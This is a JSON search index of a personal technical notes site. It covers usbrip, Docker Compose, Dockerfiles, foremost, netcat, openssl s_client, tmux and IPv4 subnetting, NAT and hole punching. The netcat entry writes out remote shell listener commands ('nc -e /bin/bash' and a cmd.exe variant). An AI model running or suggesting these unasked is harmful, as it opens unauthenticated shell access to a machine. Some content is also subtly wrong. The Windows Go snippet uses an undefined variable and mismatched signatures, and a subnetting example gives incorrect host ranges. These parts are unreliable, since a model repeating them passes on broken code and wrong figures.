	"content": "usbrip usbrip is a small piece of software which analyzes Linux log data for constructing USB event history tables.\nInstall pip3 install --upgrade usbrip  Usage usbrip MODULE SUBMODULE FLAGS  Examples show history root@kali:/mnt/hgfs/_shared_folder/# usbrip events history _ {{4}} {v2.1.4-7} _ _ ___| |_ ___[e]___ | | |_ -| . | _[N] . | |___|___|___|_| [5] _| x[!]_| https://github.com/snovvcrash/usbrip [*] Started at 2020-01-09 23:09:28 [23:09:28] [INFO] Trying to run journalctl... [23:09:28] [INFO] Successfully runned journalctl [23:09:28] [INFO] Reading journalctl output 100%|████████████████████████████████▉| 3848/3849 [00:00\u0026lt;00:00, 115044.31line/s] [?] How would you like your event history list to be generated? 1. Terminal stdout 2. JSON-file [\u0026gt;] Please enter the number of your choice (default is 1): 1 [23:09:30] [INFO] Preparing gathered events [23:09:30] [INFO] Representation: Table ┌USB-History-Events───┬──────┬──────┬──────┬───────────────────────────┬──────────────────────────────────┬───────────────┬───────┬─────────────────────┐ │ Connected │ User │ VID │ PID │ Product │ Manufacturer │ Serial Number │ Port │ Disconnected │ ├─────────────────────┼──────┼──────┼──────┼───────────────────────────┼──────────────────────────────────┼───────────────┼───────┼─────────────────────┤ │ 2020-01-08 •••••••• │ −−−− │ −−−− │ −−−− │ −−−−−−−−−−−−−−−−−−−−−−−−− │ −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−− │ −−−−−−−−−−−−− │ −−−−− │ −−−−−−−−−−−−−−−−−−− │ │ 2020-01-08 16:01:58 │ kali │ 1d6b │ 0002 │ EHCI Host Controller │ Linux 5.3.0-kali3-amd64 ehci_hcd │ 0000:02:03.0 │ usb1 │ ∅ │ │ 2020-01-08 16:01:58 │ kali │ 1d6b │ 0001 │ UHCI Host Controller │ Linux 5.3.0-kali3-amd64 uhci_hcd │ 0000:02:00.0 │ usb2 │ ∅ │ │ 2020-01-08 16:01:58 │ kali │ 0e0f │ 0003 │ VMware Virtual USB Mouse │ VMware │ ∅ │ 2-1 │ ∅ │ │ 2020-01-08 16:01:58 │ kali │ 0e0f │ 0002 │ VMware Virtual USB Hub │ ∅ │ ∅ │ 2-2 │ ∅ │ │ 2020-01-08 16:01:58 │ kali │ 0e0f │ 0008 │ Virtual Bluetooth Adapter │ VMware │ 000650268328 │ 2-2.1 │ ∅ │ └─────────────────────┴──────┴──────┴──────┴───────────────────────────┴──────────────────────────────────┴───────────────┴───────┴─────────────────────┘ [*] Shut down at 2020-01-09 23:09:30 [*] Time taken: 0:00:01.911036  search for violations usbrip events violations auth.json -f syslog _ {{4}} {v2.1.4-7} _ _ ___| |_ ___[E]___ | | |_ -| . | _[n] . | |___|___|___|_| [s] _| x[!]_| https://github.com/snovvcrash/usbrip [*] Started at 2020-01-09 23:03:24 [23:03:31] [INFO] Reading \u0026quot;/mnt/hgfs/_shared_folder/syslog\u0026quot; 100%|██████████████████████████████| 900000/900000 [00:36\u0026lt;00:00, 24803.74line/s] [23:04:09] [INFO] Opening authorized device list: \u0026quot;/mnt/hgfs/_shared_folder//auth.json\u0026quot; [23:04:11] [INFO] Searching for violations  Also see  Github  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/programming/docker-compose/",
	"title": "Docker-Compose",
	"tags": ["Programming"],
	"description": "Docker-Compose YAML.",
	"content": "Docker compose Basic example # docker-compose.yml version: '2' services: web: build: . # build from Dockerfile context: ./Path dockerfile: Dockerfile ports: - \u0026quot;5000:5000\u0026quot; volumes: - .:/code redis: image: redis  Commands docker-compose start docker-compose stop  docker-compose pause docker-compose unpause  docker-compose ps docker-compose up docker-compose down  Reference Building web: # build from Dockerfile build: .  # build from custom Dockerfile build: context: ./dir dockerfile: Dockerfile.dev  # build from image image: ubuntu image: ubuntu:14.04 image: tutum/influxdb image: example-registry:4000/postgresql image: a4bc65fd  Ports ports: - \u0026quot;3000\u0026quot; - \u0026quot;8000:80\u0026quot; # guest:host  # expose ports to linked services (not to host) expose: [\u0026quot;3000\u0026quot;]  Commands # command to execute command: bundle exec thin -p 3000 command: [bundle, exec, thin, -p, 3000]  # override the entrypoint entrypoint: /app/start.sh entrypoint: [php, -d, vendor/bin/phpunit]  Environment variables # environment vars environment: RACK_ENV: development environment: - RACK_ENV=development  # environment vars from file env_file: .env env_file: [.env, .development.env]  Dependencies # makes the `db` service available as the hostname `database` # (implies depends_on) links: - db:database - redis  # make sure `db` is alive before starting depends_on: - db  Other options # make this service extend another extends: file: common.yml # optional service: webapp  volumes: - /var/lib/mysql - ./_data:/var/lib/mysql  Advanced features Labels services: web: labels: com.example.description: \u0026quot;Accounting web app\u0026quot;  DNS servers services: web: dns: 8.8.8.8 dns: - 8.8.8.8 - 8.8.4.4  Devices services: web: devices: - \u0026quot;/dev/ttyUSB0:/dev/ttyUSB0\u0026quot;  External links services: web: external_links: - redis_1 - project_db_1:mysql  Hosts services: web: extra_hosts: - \u0026quot;somehost:192.168.1.100\u0026quot;  Network # creates a custom network called `frontend` networks: frontend:  External network # join a pre-existing network networks: default: external: name: frontend  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/programming/dockerfile/",
	"title": "Dockerfile",
	"tags": ["Programming"],
	"description": "A Dockerfile is a text document that contains all the commands a user could call on the command line to assemble an image.",
	"content": "dockerfile Reference Inheritance FROM ruby:2.2.2  Variables ENV APP_HOME /myapp RUN mkdir $APP_HOME  Initialization RUN bundle install  WORKDIR /myapp  VOLUME [\u0026quot;/data\u0026quot;] # Specification for mount point  ADD file.xyz /file.xyz COPY --chown=user:group host_file.xyz /path/container_file.xyz  Onbuild ONBUILD RUN bundle install # when used with another file  Commands EXPOSE 5900 CMD [\u0026quot;bundle\u0026quot;, \u0026quot;exec\u0026quot;, \u0026quot;rails\u0026quot;, \u0026quot;server\u0026quot;]  Entrypoint ENTRYPOINT [\u0026quot;executable\u0026quot;, \u0026quot;param1\u0026quot;, \u0026quot;param2\u0026quot;] ENTRYPOINT command param1 param2  Configures a container that will run as an executable.\nENTRYPOINT exec top -b  This will use shell processing to substitute shell variables, and will ignore any CMD or docker run command line arguments.\nMetadata LABEL version=\u0026quot;1.0\u0026quot;  LABEL \u0026quot;com.example.vendor\u0026quot;=\u0026quot;ACME Incorporated\u0026quot; LABEL com.example.label-with-value=\u0026quot;foo\u0026quot;  LABEL description=\u0026quot;This text illustrates \\ that label-values can span multiple lines.\u0026quot;  See also  Docker Docs Builder  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/00-steganography/foremost/",
	"title": "foremost",
	"tags": ["Steganography"],
	"description": "foremost description.",
	"content": "foremost Foremost is a program that recovers files based on their headers , footers and internal data structures.\nforemost -i file  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/nc/",
	"title": "nc",
	"tags": ["Tools"],
	"description": "nc description.",
	"content": "nc Usage nc OPTIONS HOST PORT  Flags -4 Forces nc to use IPv4 addresses only. -6 Forces nc to use IPv6 addresses only. -b Allow broadcast. -C Send CRLF as line-ending. -D Enable debugging on the socket. -d Do not attempt to read from stdin. -h Prints out nc help. -I length Specifies the size of the TCP receive buffer. -i interval Specifies a delay time interval between lines of text sent and received. Also, causes a delay time between connections to multiple ports. -k Forces nc to stay listening for another connection after its current connection is completed. It is an error to use this option without the -l option. -l Used to specify that nc should listen for an incoming connection rather than initiate a connection to a remote host. It is an error to use this option in conjunction with the -p, -s, or -z options. Additionally, any timeouts specified with the -w option are ignored. -n Do not do any DNS or service lookups on any specified addresses, hostnames or ports. -O length Specifies the size of the TCP send buffer. -P proxy_username Specifies a username to present to a proxy server that requires authentication. If no username is specified then authentication will not be attempted. Proxy authentication is only supported for HTTP CONNECT proxies at present. -p source_port Specifies the source port nc should use, subject to privilege restrictions and availability. -q seconds after EOF on stdin, wait the specified number of seconds and then quit. If seconds is negative, wait forever. -r Specifies that source or destination ports should be chosen randomly instead of sequentially within a range or in the order that the system assigns them. -S Enables the RFC 2385 TCP MD5 signature option. -s source Specifies the IP of the interface that is used to send the packets. For UNIX-domain datagram sockets, specifies the local temporary socket file to create and use so that datagrams can be received. It is an error to use this option in conjunction with the -l option. -T toskeyword Change IPv4 TOS value. toskeyword may be one of critical, inetcontrol, lowcost, lowdelay, netcontrol, throughput, reliability, or one of the DiffServ Code Points: ef, af11 ... af43, cs0 ... cs7; or a number in either hex or decimal. -t Causes nc to send RFC 854 DON'T and WON'T responses to RFC 854 DO and WILL requests. This makes it possible to use nc to script telnet sessions. -U Specifies to use UNIX-domain sockets. -u Use UDP instead of the default option of TCP. For UNIX-domain sockets, use a datagram socket instead of a stream socket. If a UNIX-domain socket is used, a temporary receiving socket is created in /tmp unless the -s flag is given. -V rtable Set the routing table to be used. The default is 0. -v Have nc give more verbose output. -w timeout Connections which cannot be established or are idle timeout after timeout seconds. The -w flag has no effect on the -l option, i.e. nc will listen forever for a connection, with or without the -w flag. The default is no timeout. -X proxy_protocol Requests that nc should use the specified protocol when talking to the proxy server. Supported protocols are \u0026quot;4\u0026quot; (SOCKS v.4), \u0026quot;5\u0026quot; (SOCKS v.5) and \u0026quot;connect\u0026quot; (HTTPS proxy). If the protocol is not specified, SOCKS version 5 is used. -x proxy_address[:port] Requests that nc should connect to destination using a proxy at proxy_address and port. If port is not specified, the well-known port for the proxy protocol is used (1080 for SOCKS, 3128 for HTTPS). -Z DCCP mode. -z Specifies that nc should only scan for listening daemons, without sending any data to them. It is an error to use this option in conjunction with the -l option.  Examples Netcat listening on port 567/TCP nc -l -p 567  Connecting to that port from another machine nc 1.2.3.4 5676  pipe a text file to the listener cat infile | nc 1.2.3.4 567 -q 10  save a received text file nc -l -p 567 \u0026gt; textfile  transfer a directory first at the receiving end set up\nnc -l -p 678 | tar xvfpz  Then send the directory\ntar zcfp - /path/to/directory | nc -w 3 1.2.3.4 678  send a message to your syslog server \u0026quot;echo '\u0026lt;0\u0026gt;message' | nc -w 1 -u syslogger 514\u0026quot;  Setting up a remote shell listener nc -v -e '/bin/bash' -l -p 1234 -t  or\nnc l p 1234 e \u0026quot;c\\windows\\system32\\cmd.exe\u0026quot;  Then telnet to port 1234 from elsewhere to get the shell.\nUsing netcat to make an HTTP request echo -e \u0026quot;GET http//www.google.com HTTP/1.0nn\u0026quot; | nc -w 5 www.google.com 80  Making a one-page webserver cat homepage.txt | nc -v -l -p 80  Also see  Netcat Commands  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/openssl/",
	"title": "Openssl",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/openssl/s_client/",
	"title": "s_client",
	"tags": ["Openssl"],
	"description": "s_client description.",
	"content": "s_client Usage openssl s_client OPTIONS ARGUMENTS  Examples Check an SSL connection openssl s_client -connect example.com:443 openssl s_client -host example.com -port 443  Make an SSL connection. Hide most info openssl s_client --connect 127.0.0.1:30001 -quiet depth=0 CN = localhost verify error:num=18:self signed certificate verify return:1 depth=0 CN = localhost verify return:1  show full certificate chain openssl s_client -showcerts -host example.com -port 443 \u0026lt;/dev/null  Extract the certificate openssl s_client -connect example.com:443 2\u0026gt;\u0026amp;1 \u0026lt; /dev/null | sed -n '/-----BEGIN/,/-----END/p' \u0026gt; certificate.pem  Test for TLS/SSL version cipher openssl s_client -host example.com -port 443 -ssl3 2\u0026gt;\u0026amp;1 \u0026lt;/dev/null  Options\n-ssl2 -ssl3 -tls1 -tls1_1 -tls1_2  Test for specific cipher openssl s_client -host example.com -port 443 -cipher ECDHE-RSA-AES128-GCM-SHA256 2\u0026gt;\u0026amp;1 \u0026lt;/dev/null  Measure SSL connection time without/with session reuse openssl s_time -connect example.com:443 -new openssl s_time -connect example.com:443 -reuse  "
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/tmux/",
	"title": "tmux",
	"tags": ["Unix Commands"],
	"description": "tmux description.",
	"content": "tmux Usage start new:\ntmux  start new with session name:\ntmux new -s myname  attach:\ntmux a # (or at, or attach)  attach to named:\ntmux a -t myname  list sessions:\ntmux ls  kill session:\ntmux kill-session -t myname  Kill all the tmux sessions:\ntmux ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs kill  In tmux, hit the prefix ctrl+b (my modified prefix is ctrl+a) and then:\nSessions :new\u0026lt;CR\u0026gt; new session s list sessions $ name session  Windows (tabs) c create window w list windows n next window p previous window f find window , name window \u0026amp; kill window  Panes (splits) % vertical split \u0026quot; horizontal split o swap panes q show pane numbers x kill pane + break pane into window (e.g. to select text by mouse to copy) - restore pane from window ⍽ space - toggle between layouts \u0026lt;prefix\u0026gt; q (Show pane numbers, when the numbers show up type the key to goto that pane) \u0026lt;prefix\u0026gt; { (Move the current pane left) \u0026lt;prefix\u0026gt; } (Move the current pane right) \u0026lt;prefix\u0026gt; z toggle pane zoom  Renaming , name pane :rename rename session  Sync Panes You can do this by switching to the appropriate window, typing your Tmux prefix (commonly Ctrl-B or Ctrl-A) and then a colon to bring up a Tmux command line, and typing:\n:setw synchronize-panes  You can optionally add on or off to specify which state you want; otherwise the option is simply toggled. This option is specific to one window, so it won’t change the way your other sessions or windows operate. When you’re done, toggle it off again by repeating the command. tip source\nResizing Panes You can also resize panes if you don’t like the layout defaults. I personally rarely need to do this, though it’s handy to know how. Here is the basic syntax to resize panes:\nPREFIX : resize-pane -D (Resizes the current pane down) PREFIX : resize-pane -U (Resizes the current pane upward) PREFIX : resize-pane -L (Resizes the current pane left) PREFIX : resize-pane -R (Resizes the current pane right) PREFIX : resize-pane -D 20 (Resizes the current pane down by 20 cells) PREFIX : resize-pane -U 20 (Resizes the current pane upward by 20 cells) PREFIX : resize-pane -L 20 (Resizes the current pane left by 20 cells) PREFIX : resize-pane -R 20 (Resizes the current pane right by 20 cells) PREFIX : resize-pane -t 2 20 (Resizes the pane with the id of 2 down by 20 cells) PREFIX : resize-pane -t -L 20 (Resizes the pane with the id of 2 left by 20 cells)  Copy mode Pressing PREFIX [ places us in Copy mode. We can then use our movement keys to move our cursor around the screen. By default, the arrow keys work. we set our configuration file to use Vim keys for moving between windows and resizing panes so we wouldn’t have to take our hands off the home row. tmux has a vi mode for working with the buffer as well. To enable it, add this line to .tmux.conf:\nsetw -g mode-keys vi  With this option set, we can use h, j, k, and l to move around our buffer.\nTo get out of Copy mode, we just press the ENTER key. Moving around one character at a time isn’t very efficient. Since we enabled vi mode, we can also use some other visible shortcuts to move around the buffer.\nFor example, we can use \u0026ldquo;w\u0026rdquo; to jump to the next word and \u0026ldquo;b\u0026rdquo; to jump back one word. And we can use \u0026ldquo;f\u0026rdquo;, followed by any character, to jump to that character on the same line, and \u0026ldquo;F\u0026rdquo; to jump backwards on the line.\nFunction vi emacs Back to indentation ^ M-m Clear selection Escape C-g Copy selection Enter M-w Cursor down j Down Cursor left h Left Cursor right l Right Cursor to bottom line L Cursor to middle line M M-r Cursor to top line H M-R Cursor up k Up Delete entire line d C-u Delete to end of line D C-k End of line $ C-e Goto line : g Half page down C-d M-Down Half page up C-u M-Up Next page C-f Page down Next word w M-f Paste buffer p C-y Previous page C-b Page up Previous word b M-b Quit mode q Escape Scroll down C-Down or J C-Down Scroll up C-Up or K C-Up Search again n n Search backward ? C-r Search forward / C-s Start of line 0 C-a Start selection Space C-Space Transpose chars C-t  Misc d detach t big clock ? list shortcuts : prompt  Configurations Options # Mouse support - set to on if you want to use the mouse * setw -g mode-mouse off * set -g mouse-select-pane off * set -g mouse-resize-pane off * set -g mouse-select-window off # Set the default terminal mode to 256color mode set -g default-terminal \u0026quot;screen-256color\u0026quot; # enable activity alerts setw -g monitor-activity on set -g visual-activity on # Center the window list set -g status-justify centre # Maximize and restore a pane unbind Up bind Up new-window -d -n tmp \\; swap-pane -s tmp.1 \\; select-window -t tmp unbind Down bind Down last-window \\; swap-pane -s tmp.1 \\; kill-window -t tmp  Also see  MohamedAlaa Tmux Cheatsheet  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/guides/",
	"title": "Guides",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/guides/",
	"title": "Guides",
	"tags": ["Main Page"],
	"description": "Guides.",
	"content": "Guides   Ubuntu VPS   Setup a \u0026#39;publicly accessible\u0026#39; Ubuntu VPS\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/networking/osi-model/layer3/",
	"title": "Layer 3",
	"tags": ["OSI Model"],
	"description": "Structuring and managing a multi-node network, including addressing, routing and traffic control.",
	"content": "Layer 3          Num 3   Name Network   Acronim Not   PDU Packet   What is \u0026lsquo;on it\u0026rsquo; Router   Function Structuring and managing a multi-node network, including addressing, routing and traffic control    Network layer works for the transmission of data from one host to the other located in different networks. It also takes care of packet routing i.e. selection of the shortest path to transmit the packet, from the number of routes available. The sender \u0026amp; receiver’s IP address are placed in the header by network layer.\nThe functions of the Network layer are :\n Routing: The network layer protocols determine which route is suitable from source to destination. This function of network layer is known as routing. Logical Addressing: In order to identify each device on internetwork uniquely, network layer defines an addressing scheme. The sender \u0026amp; receiver’s IP address are placed in the header by network layer. Such an address distinguishes each device uniquely and universally.  IPv4 Subnetting Netmask depends the range of the network. 1's in the netmask lockdown the IP address.\nSmall mask = Large network\nLarge mask = Small network\nBinary - 255    128 64 32 16 8 4 2 1     1 1 1 1 1 1 1 1    Binary - 7    128 64 32 16 8 4 2 1     0 0 0 0 0 1 1 1    CIDR - /32    255 255 255 255     1111 1111 1111 1111 1111 1111 1111 1111    CIDR - /24    255 255 255 0     1111 1111 1111 1111 1111 1111 0000 0000    CIDR - /22    255 255 252 0     1111 1111 1111 1111 1111 1100 0000 0000    school example\nIP 192.168.1.0 Neem je masker 255.255.255.192 Het eerste groene getal pakken Aftrekken van 256 256-192 = 64 128 64 32 16 8 4 2 1 De stappen van het eerste groene getal zullen 64 zijn 1e 192.168.1.0 NETID 192.168.1.1 LB 192.168.1.63 HB 192.168.1.64 BC 172.168.0.0 255.255.252.0 256-252=4 128 64 32 16 8 4 2 1 1e 172.168.0.0 172.168.0.1 172.168.4.254 172.168.4.255 IP 192.168.100.0 MASK 255.255.255.224 224 aftrekken 255 255.255.255.255 255.255.255.224 - 31 Trek een streep waar het vorige getal tussen past. 128 64 32|16 8 4 2 1 1 subnet NETID 192.168.100.0 LB 192.168.100.1 HB 192.168.100.30 BC 192.168.100.31 2 subnet NETID 192.168.100.32 LB 192.168.100.33 HB 192.168.100.62 BC 192.168.100.63 3 subnet NETID 192.168.100.64 LB 192.168.100.65 HB 192.168.100.94 BC 192.168.100.95 4 subnet NETID 192.168.100.96 LB 192.168.100.97 HB 192.168.100.126 BC 192.168.100.127 5 subnet NETID 192.168.100.128 LB 192.168.100.129 HB 192.168.100.158 BC 192.168.100.159 6 subnet NETID 192.168.100.160 LB 192.168.100.161 HB 192.168.100.190 BC 192.168.100.191 7 subnet NETID 192.168.100.192 LB 192.168.100.193 HB 192.168.100.222 BC 192.168.100.223 8 subnet NETID 192.168.100.224 LB 192.168.100.225 HB 192.168.100.253 BC 192.168.100.255  Table example Subnet Table\n   Octect Subnet: 128 Subnet: 192 Subnet: 224 Subnet: 240 Subnet: 248 Subnet: 252 Subnet: 254 subnet: 255     1 /1 /2 /3 /4 /5 /6 /7 /8   2 /9 /10 /11 /12 /13 /14 /15 /16   3 /17 /18 /19 /20 /21 /22 /23 /24   4 /25 /26 /27 /28 /29 /30 /31 /32    Host Table\n   Octect Hosts: Hosts Hosts Hosts Hosts Hosts Hosts Hosts     1 /1 2147483648 /2 1073741824 /3 536870912 /4 268435456 /5 134217728 /6 67108864 /7 33554432 /8 16777216   2 /9 8388608 /10 4194304 /11 2097152 /12 1048576 /13 524288 /14 262144 /15 131072 /16 65536   3 /17 32768 /18 16384 /19 8192 /20 4096 /21 2048 /22 1024 /23 512 /24 256   4 /25 128 /26 64 /27 32 /28 16 /29 8 /30 4 /31 2 /32 1    Willdcard Mask Table\n   Slash Netmask Wildcard Mask     /32 255.255.255.255 0.0.0.0   /31 255.255.255.254 0.0.0.1   /30 255.255.255.252 0.0.0.3   /29 255.255.255.248 0.0.0.7   /28 255.255.255.240 0.0.0.15   /27 255.255.255.224 0.0.0.31   /26 255.255.255.192 0.0.0.63   /25 255.255.255.128 0.0.0.127   /24 255.255.255.0 0.0.0.255   /23 255.255.254.0 0.0.1.255   /22 255.255.252.0 0.0.3.255   /21 255.255.248.0 0.0.7.255   /20 255.255.240.0 0.0.15.255   /19 255.255.224.0 0.0.31.255   /18 255.255.192.0 0.0.63.255   /17 255.255.128.0 0.0.127.255   /16 255.255.0.0 0.0.255.255   /15 255.254.0.0 0.1.255.255   /14 255.252.0.0 0.3.255.255   /13 255.248.0.0 0.7.255.255   /12 255.240.0.0 0.15.255.255   /11 255.224.0.0 0.31.255.255   /10 255.192.0.0 0.63.255.255   /9 255.128.0.0 0.127.255.255   /8 255.0.0.0 0.255.255.255   /7 254.0.0.0 1.255.255.255   /6 252.0.0.0 3.255.255.255   /5 248.0.0.0 7.255.255.255   /4 240.0.0.0 15.255.255.255   /3 224.0.0.0 31.255.255.255   /2 192.0.0.0 63.255.255.255   /1 128.0.0.0 127.255.255.255   /0 0.0.0.0 255.255.255.255    Example 1 Subnet to calculate 192.168.1.X/25 /25 is on row 4 of our subnet table, this means the first 3 octets of our netmask are locked down and the last octect is unknown. 255.255.255.? Our unknown octet has the value 128 as seen on the header of the Subnet Table. This means our netmask is 255.255.255.128. There are 128 hosts using this netmask as seen in Host Table. 2 of those are not usable, the broadcast (BC) and Network ID(NETID), this means there are 126 usable hosts in this subnet. We start counting these hosts from 0. To define our range of usable hosts we will use the Lowest Usable (LU) and the Highest Usable (HU). This means our LU in this case will be 192.168.1.1 and our HU will be 192.168.1.126. First Subnet NETID 192.168.1.0 LU 192.168.1.1 HU 192.168.1.126 BC 192.168.1.127 Second Subnet NETID 192.168.1.128 LU 192.168.1.129 HU 192.168.1.254 BC 192.168.1.255  Example 2 Subnet to calculate 10.0.X.X/10 /10 is on row 2 of the subnet table, this means the first octet of our netmask are locked down to 255, the second octect is unknown and the rest are locked down to 0. 255.?.0.0 Our unknown octect has the value of 192 as seen in the header of the subnet table. This means our netmask is 255.192.0.0. There are 4194304 hosts using this netmask as seen in the host table. 2 of those are not usable, the broadcast (BC) and Network ID(NETID), this means there are 4194302 usable hosts in this subnet. We start counting these hosts from 0. To define our range of usable hosts we will use the Lowest Usable (LU) and the Highest Usable (HU). Since this is a bigger range the Wildcard Mask can be used to make this easier. To get our wildcard mask we inverse of our mask. Our wildcard mask is 0.63.255.255. See Wildcard Mask table. This means our LU in this case will be 10.0.0.1 and our HU will be 10.63.255.254. NETID 10.0.0.0 LU 10.0.0.1 HU 10.63.255.254 BC 10.63.255.255 NETID 10.64.0.0 LU 10.64.0.1 HU 10.127.255.254 BC 10.127.255.255 NETID 10.128.0.0 LU 10.128.0.1 HU 10.191.255.254 BC 10.191.255.255 NETID 10.192.0.0 LU 10.192.0.1 HU 10.255.255.254 BC 10.255.255.255  Network Classes IP Addresses identify both a network as well as host on a network. Depending on the class of a network, certain amount of bits in the IP (32 bits overall) are allocated for network adressing and the rest is for: adressing the host on the network.\n Class A: first octet is network, last three: host Class B: first two octets are for network, last two: host Class C: first three octets are for network, only last octet is for host.  Furthermore, looking at the IP itself, you can tell which class of IP it is, using the following rules:\n   Class Binary Prefix First Octet of dotted-decimal must be Excluded Addresses     A 0 0 to 127 10.% and 127.%   B 10 128 to 191 172.16.% to 172.31.%   C 110 192 to 223 192.168.% to 192.168.%   D(Multicast) 1110 224 to 239    E(Experimental) 11110 240 to 254     Additional, Special IP Rules:\n All-zeros (in decimal) host is the network itself. E.g. 141.23.0.0 - is the network 141.23 All-ones (in decimal) is a broadcast address signaling to all hosts of the network, e.g. 141.23.255.255 is a broadcast address for the 141.23 network  Please note that 255.255.255.255 can also be used to broadcast on a current network.   127.% are loopback IPs RFC1597 reserves following ranges for private networks:  10.% 172.16.% - 172.31.% 192.168.% - 192.168.%   Reserved for Autoconfiguration Range: 169.254.% to 169.%  Classless Inter-Domain Routing (CIDR) CIDR notation indicates how many bits are taken in the mask by network + subnet. Remembering that overall there are 32 bits, the remaining bits can be used for host addresses. For instance: /25 indicates that 32-25 = 7 bits are available for the host portion, making 2^7=128 (in reality 128-2 = 126) host addresses available for assignment. The full CIDR address includes an IP (usually: lowest IP) of the range, e.g.: 192.168.100.14/24\nExample CIDR -\u0026gt; IP Range Calculation CIDR: 212.100.105.0/22\nSteps:\n  Figure-out netmask.\nSince 32-22 = 10, first two octets are all 1\u0026rsquo;s, last one is all 0\u0026rsquo;s and first six bits of the third octet are 1\u0026rsquo;s. Calculating 128+64+32+16+8+4 = 252, the final netmask is: 255.255.252.0. Obviously, here we remembered bit weights: 128,64,32,16,8,4,2,1 by heart, but if you don\u0026rsquo;t, you just need to remember 128 is the high bit and the rest are sequence of dividing by 2 until 1.\n  Calculate IP range of the range.\nKnowing our netmask, we know that the lowest IP will have the same number in the first two octets as the example IP: 212.100.%. Since last octet is not masked, lowest IP will have it as zero, so we just need to figure-out lowest allowed number in the third octet. Third octet (252) in binary is: \u0026lsquo;1111 - 1100\u0026rsquo; which would enforce that the first six bits of the example IP are the same for all IPs in range. 105 in binary is: \u0026lsquo;0110 - 1001\u0026rsquo;, therefore the lowest number with fixed six bits is: \u0026lsquo;0110-1000\u0026rsquo; (64+32+8=104) and highest is: \u0026lsquo;0110 - 1011\u0026rsquo; (64+32+8+2+1=107), where bolded-out part is the fixed part. Considering this, the final range is: 212.100.104.0 - 212.100.107.255.\n  There\u0026rsquo;re also some really nice online calculators for these, e.g.: http://www.ipaddressguide.com/cidr\nPlease note: as a practical matter most commonly, CIDR ranges do indicate the lowest IP, since lowest IP is the network IP and the highest is broadcast IP, for that network. However, as we saw - we can calculate the proper range even if any other IP from the range is given (possibly: by mistake).\nNAT types An old version of the stun spec (RFC3489) defined the following NAT variations:\nFull Cone: A full cone NAT is one where all requests from the same internal IP address and port are mapped to the same external IP address and port. Furthermore, any external host can send a packet to the internal host, by sending a packet to the mapped external address.\nRestricted Cone: A restricted cone NAT is one where all requests from the same internal IP address and port are mapped to the same external IP address and port. Unlike a full cone NAT, an external host (with IP address X) can send a packet to the internal host only if the internal host had previously sent a packet to IP address X.\nPort Restricted Cone: A port restricted cone NAT is like a restricted cone NAT, but the restriction includes port numbers. Specifically, an external host can send a packet, with source IP address X and source port P, to the internal host only if the internal host had previously sent a packet to IP address X and port P.\nSymmetric: A symmetric NAT is one where all requests from the same internal IP address and port, to a specific destination IP address and port, are mapped to the same external IP address and port. If the same host sends a packet with the same source address and port, but to a different destination, a different mapping is used. Furthermore, only the external host that receives a packet can send a UDP packet back to the internal host.\nAdditional research can be found in RFC5780\nccding/go-stun may be helpful to figure out your nat type(s).\nNAT considerations NAT bindings should not be considered to be deterministic:\n If an external port is already mapped to another host the NAT has to assign you another port. Some routers implement randomized port mapping.  Hole punching Hole punching is an easy way to circumvent a NAT. Peers try to establish a direct connection by learning their respective public addresses using a 3rd party server. The 3rd party server is also used to keep the NAT binding alive.\nThe hole punching examples below can be used to get through the Full Cone, Restricted Cone and Port Restricted Cone NAT types. Symmetric NATs require more complex processes. However, this NAT type is more rare and can still be circumvented using a TURN server to relay traffic.\nUDP hole punching First establisch a local connection by listening using net.ListenUDP. Next use WriteTo and ReadFrom to send and receive packets to and from the desired remote addresses.\nTCP hole punching TCP hole punching is a little more involved. In order to keep the NAT binding alive the same local TCP port should be used. This can be done by setting the SO_REUSEADDR and SO_REUSEPORT socket options on most operating systems. Sadly this isn\u0026rsquo;t well supported until go1.11 as discussed in golang/go#9661. Starting from go1.11 the flag can be set using the Dialer.Control function.\nExample (dial.go):\nvar d net.Dialer d.Control = controlOnConnSetup func controlOnConnSetup(network string, address string, c syscall.RawConn) error { return nil }  For Unix (dial_unix.go):\n// +build darwin dragonfly freebsd linux netbsd openbsd solaris func controlOnConnSetup(c syscall.RawConn, addr Addr) error { var operr error fn := func(s uintptr) { operr = syscall.SetsockoptInt(int(s), syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1) if operr != nil { return } operr = syscall.SetsockoptInt(int(s), syscall.SOL_SOCKET, syscall.SO_REUSEPORT, 1) if operr != nil { return } } if err := c.Control(fn); err != nil { return err } if operr != nil { return operr } return nil }  For Windows (dial_windows.go):\nfunc controlOnConnSetup(network string, address string, c syscall.RawConn) error { var operr error fn := func(s uintptr) { handle := syscall.Handle(fd) operr = syscall.SetsockoptInt(handle, syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1) if operr != nil { return } } if err := c.Control(fn); err != nil { return err } if operr != nil { return operr } return nil }  Candidate types and combinations of NAT types Following chart summarises which types of candidates contribute to a successful NAT traversal in each combination of local and remote NAT types.\n    Open F.Cone R.Cone PR.Cone Symmetric     Open host srflx or prflx srflx or prflx srflx or prflx prflx   F.Cone srflx or prflx srflx srflx srflx srflx and prflx   R.Cone srflx or prflx srflx srflx srflx srflx and prflx   PR.Cone srflx or prflx srflx srflx srflx relay   Symmetric prflx srflx and prflx srflx and prflx relay relay     Open: Open to the Internet F.Cone: Full-cone NAT R.Cone: Restricted-cone NAT PR.Cone: Port restricted-cone NAT Symmetric: Symmetric NAT host: Local (host) address candidate srflx: Server reflexive candidate (a candidate derived from STUN) prflx: Peer reflexive candidate relay: Relay NAT (a candidate derived from TURN)  P.A.T. Port Address Translation \u0026gt; 1024\n   my local ip my local port my external ip my external port external ip     192.168.3.1 :1025 9.2.1.33 :1025 188.1.3.15   192.168.3.2 :1025 9.2.1.33 :1026 188.1.3.15   192.168.3.3 :1025 9.2.1.33 :1027 188.1.3.15    IPv6 Also see  IP Address Classes NAT  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/notes/",
	"title": "Notes",
	"tags": [],
	"description": "",
	"content": ""
